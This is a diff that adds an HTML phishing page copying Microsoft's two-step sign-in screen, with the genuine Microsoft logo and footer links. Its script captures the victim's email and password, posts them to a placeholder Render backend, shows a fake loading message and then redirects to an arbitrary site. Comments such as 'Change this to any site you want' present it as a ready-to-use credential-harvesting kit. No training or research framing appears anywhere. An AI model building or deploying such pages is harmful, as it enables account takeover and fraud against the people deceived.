@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: #f3f3f3;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .middle {
+            width: 440px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+        }
+        .lightbox { padding: 44px 40px 40px; }
+        .logo { width: 108px; height: 24px; margin-bottom: 32px; }
+        .title { font-size: 28px; font-weight: 600; color: #1f1f1f; margin-bottom: 24px; }
+        .input-container { margin-bottom: 24px; }
+        .input {
+            width: 100%;
+            padding: 11px 12px;
+            font-size: 15px;
+            border: 1px solid #8a8a8a;
+            border-radius: 4px;
+        }
+        .input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.25);
+        }
+        .links { margin: 20px 0 32px 0; font-size: 14px; line-height: 1.5; }
+        .links a { color: #0078d4; text-decoration: none; }
+        .links a:hover { text-decoration: underline; }
+        .button-container { display: flex; justify-content: flex-end; gap: 12px; }
+        .btn {
+            padding: 8px 24px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn-secondary { background: transparent; color: #0078d4; }
+        .btn-secondary:hover { background: #f5f5f5; }
+        .btn-primary { background: #0078d4; color: white; border: none; }
+        .btn-primary:hover { background: #0069c0; }
+        .password-screen { display: none; }
+        .subtitle { font-size: 15px; color: #555; margin-bottom: 6px; }
+        .username-display { font-size: 15px; font-weight: 600; color: #1f1f1f; margin-bottom: 24px; }
+        .footer {
+            padding: 16px 40px;
+            background: white;
+            border-top: 1px solid #e5e5e5;
+            font-size: 12px;
+            color: #666;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        .footer a { color: #666; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .loading { text-align: center; padding: 30px; color: #0078d4; font-size: 15px; }
+    </style>
+</head>
+<body>
+
+    <div class="middle">
+
+        <!-- Username Screen -->
+        <div id="usernameScreen" class="lightbox">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" class="logo">
+            <div class="title">Sign in</div>
+
+            <div class="input-container">
+                <input type="email" id="i0116" class="input" placeholder="Email, phone, or Skype" autocomplete="username" required>
+            </div>
+
+            <div class="links">
+                No account? <a href="#" onclick="alert('Sign up page would open here')">Create one!</a><br><br>
+                <a href="#" onclick="alert('Account recovery would open here')">Can’t access your account?</a>
+            </div>
+
+            <div class="button-container">
+                <button type="button" class="btn btn-secondary" onclick="history.back()">Back</button>
+                <button type="button" class="btn btn-primary" onclick="goToPassword()">Next</button>
+            </div>
+        </div>
+
+        <!-- Password Screen -->
+        <div id="passwordScreen" class="lightbox password-screen">
+            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" class="logo">
+            <div class="subtitle">Enter your password</div>
+            <div id="usernameDisplay" class="username-display"></div>
+
+            <form id="passwordForm">
+                <div class="input-container">
+                    <input type="password" id="i0118" class="input" placeholder="Password" autocomplete="current-password" required>
+                </div>
+
+                <div class="links">
+                    <a href="#" onclick="alert('Forgot password flow would start here')">Forgot my password?</a>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="btn btn-secondary" onclick="goBackToUsername()">Back</button>
+                    <button type="submit" class="btn btn-primary">Sign in</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Loading screen -->
+        <div id="loadingScreen" class="lightbox" style="display: none;">
+            <div class="loading">Signing you in...<br><br>Please wait</div>
+        </div>
+
+        <div class="footer">
+            <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank">Terms of use</a>
+            <a href="https://privacy.microsoft.com/en-US/privacystatement" target="_blank">Privacy &amp; cookies</a>
+            <a href="#" style="margin-left: auto;" onclick="alert('More options')">...</a>
+        </div>
+    </div>
+
+    <script>
+        // ==================== CONFIG ====================
+        const REDIRECT_URL = "https://pornhub.com";   // ← Change this to any site you want
+
+        // The URL of your backend on Render (we'll create this in the steps below)
+        const BACKEND_URL = "https://your-backend-name.onrender.com/save";  
+        // ===============================================
+
+        function goToPassword() {
+            const email = document.getElementById('i0116').value.trim();
+            if (!email) {
+                alert("Please enter your email, phone, or Skype.");
+                return;
+            }
+            document.getElementById('usernameScreen').style.display = 'none';
+            document.getElementById('passwordScreen').style.display = 'block';
+            document.getElementById('usernameDisplay').textContent = email;
+            setTimeout(() => document.getElementById('i0118').focus(), 100);
+        }
+
+        function goBackToUsername() {
+            document.getElementById('passwordScreen').style.display = 'none';
+            document.getElementById('usernameScreen').style.display = 'block';
+        }
+
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('usernameDisplay').textContent;
+            const password = document.getElementById('i0118').value.trim();
+
+            if (!password) {
+                alert("Please enter your password.");
+                return;
+            }
+
+            // Show loading
+            document.getElementById('passwordScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+
+            // Send credentials to backend
+            try {
+                await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, timestamp: new Date().toISOString() })
+                });
+            } catch (err) {
+                console.error("Failed to save credentials", err);
+                // Still continue even if saving fails
+            }
+
+            // Redirect after a short delay
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
